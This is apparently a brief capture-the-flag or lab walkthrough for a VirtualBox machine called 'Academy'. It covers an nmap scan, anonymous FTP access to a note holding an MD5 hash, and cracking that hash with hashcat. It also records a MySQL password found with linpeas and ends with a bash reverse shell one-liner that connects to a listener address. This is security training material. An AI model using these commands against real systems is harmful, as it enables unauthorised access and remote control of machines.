# Academy

## IP Address

`10.0.2.5`

## nmap

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 21:47 EDT
    Nmap scan report for 10.0.2.5
    Host is up (0.00057s latency).
    Not shown: 65532 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.0.2.4
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
    |   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
    |_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-title: Apache2 Debian Default Page: It works
    |_http-server-header: Apache/2.4.38 (Debian)
    MAC Address: 08:00:27:0C:57:23 (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.6
    Network Distance: 1 hop
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.57 ms 10.0.2.5

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds

## Note.txt


    Hello Heath !
    Grimmie has setup the test website for the new academy.
    I told him not to use the same password everywhere, he will change it ASAP.


    I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

    INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
    ('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

    The StudentRegno number is what you use for login.


    Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
    We can always adapt it to our needs.

    -jdelta


## Identifying Hash

`Hash-identifier` (Built into Kali)

## Cracking MD5 Hash

`hashcat -m 0 cd73502828457d15655bbd7a63fb0bc8 /usr/share/wordlists/rockyou.txt`

Hash:Password - `cd73502828457d15655bbd7a63fb0bc8:student`

## mySQL Password

Found using linpeas - `$mysql_password = "My_V3ryS3cur3_P4ss";`

## pspy64 

pspy is a command line tool designed to snoop on processes without need for root permissions.

`https://github.com/DominicBreuker/pspy`

## Bash Reverse Shell

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
